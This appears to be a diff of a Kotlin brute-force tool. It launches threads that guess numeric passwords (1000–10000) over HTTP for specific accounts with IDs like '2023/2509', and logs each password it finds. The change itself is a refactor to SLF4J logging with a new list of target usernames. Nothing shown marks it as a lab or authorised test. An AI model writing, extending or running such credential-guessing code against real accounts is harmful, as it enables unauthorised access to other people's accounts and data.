@@ -5,6 +5,7 @@ import org.apache.hc.client5.http.impl.classic.CloseableHttpClient
 import org.apache.hc.client5.http.impl.classic.HttpClients
 import org.apache.hc.core5.http.io.entity.EntityUtils
 import org.apache.hc.core5.http.io.entity.StringEntity
+import org.slf4j.LoggerFactory
 import kotlin.concurrent.thread
 import kotlin.system.measureTimeMillis
 
@@ -15,18 +16,12 @@ fun main() {
     //This machine has a 6 cores hyper-threaded CPU,
     //so don't run more than 12 bruteForceTask on this machine
 
-    bruteforceTask("2023/2507", "T1")
-    bruteforceTask("2023/2508", "T2")
-    bruteforceTask("2023/2509", "T3")
-    bruteforceTask("2023/2510", "T4")
-    bruteforceTask("2023/2511", "T5")
-    bruteforceTask("2023/2512", "T6")
-    bruteforceTask("2023/2513", "T7")
-    bruteforceTask("2023/2514", "T8")
-    bruteforceTask("2023/2515", "T9")
-    bruteforceTask("2023/2516", "T10")
-    bruteforceTask("2023/2517", "T11")
-    bruteforceTask("2023/2518", "T12")
+    bruteforceTask("2023/2502")
+    bruteforceTask("2023/2503")
+    bruteforceTask("2023/2509")
+    bruteforceTask("2023/2510")
+    bruteforceTask("2023/2511")
+    bruteforceTask("2023/2512")
 }
 
 
@@ -82,19 +77,21 @@ fun bruteforce(username:String, start:Int=1000, end:Int=10000): String? {
 
 //Beware that it creates a new thread and run bruteforce method on in it
 
-fun bruteforceTask(username:String, threadName:String){
+fun bruteforceTask(username:String){
+    val logger = LoggerFactory.getLogger("Main")
+
     thread {
         val threadExecutionTime = measureTimeMillis {
-            println("Thread $threadName started...")
+            logger.info("Bruteforce started for $username...")
             val password = bruteforce(username)
             if(password.isNullOrBlank()){
-                println("User does not exist")
+                logger.info("User does not exist")
             }
             else{
-                println("Password found of $username: $password")
+                logger.info("Password found of $username: $password")
             }
         }
-        println("Bruteforce finished by thread $threadName in: $threadExecutionTime ms")
+        logger.info("Bruteforce finished by in: $threadExecutionTime ms")
     }
 }
 
